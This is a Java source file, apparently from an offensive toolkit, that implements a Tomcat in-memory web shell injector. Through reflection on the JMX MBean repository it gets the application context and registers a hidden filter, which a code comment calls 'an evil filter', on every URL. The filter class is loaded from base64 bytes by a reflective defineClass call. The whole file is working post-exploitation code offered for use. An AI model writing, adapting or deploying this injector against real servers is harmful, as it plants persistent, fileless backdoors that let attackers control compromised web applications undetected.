package payload.memshell;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Set;

public class TomcatShell {
    private String filterCode;

    public TomcatShell() {
        try {
            filterCode = "";
            exec();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // work on Tomcat/8.5.38
    private void exec() throws Exception {
        String filterName = "dynamicFilter";

        MBeanServer mbs = Registry.getRegistry(null, null).getMBeanServer();

        Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
        field.setAccessible(true);
        Object obj = field.get(mbs);

        field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
        field.setAccessible(true);
        Repository repository  = (Repository) field.get(obj);

        Set<NamedObject> objects =  repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
        for (NamedObject namedObj : objects) {
            try {
                DynamicMBean dynamicMBean = namedObj.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext context = (StandardContext) field.get(obj);

                // 为什么这里 context 还是 TomcatEmbeddedContext 类型
                field = context.getClass().getSuperclass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> configs = (HashMap<String, ApplicationFilterConfig>) field.get(context);

                if (configs.get(filterName) == null) {
                    // register an evil filter
                    Class<?> filterDefClass;
                    filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");

                    Object filterDef = filterDefClass.newInstance();
                    filterDefClass.getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Class<?> clazz;
                    try {
                        clazz = cl.loadClass("payload.memshell.DynamicFilter");
                    } catch (ClassNotFoundException e) {
                        byte[] bytes = Base64.getDecoder().decode(filterCode);

                        Method method = null;
                        Class clz = cl.getClass();
                        while (method == null && clz != Object.class) {
                            try {
                                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            } catch (NoSuchMethodException ex) {
                                clz = clz.getSuperclass();
                            }
                        }

                        method.setAccessible(true);
                        clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                    }

                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
                    context.getClass().getSuperclass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(context, filterDef);

                    Class<?> filterMapClass;
                    filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");

                    Object filterMap = filterMapClass.newInstance();
                    filterMapClass.getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                    filterMapClass.getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMapClass.getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, "/*");
                    context.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(context, filterMap);

                    Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = constructor.newInstance(context, filterDef);
                    configs.put(filterName, filterConfig);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
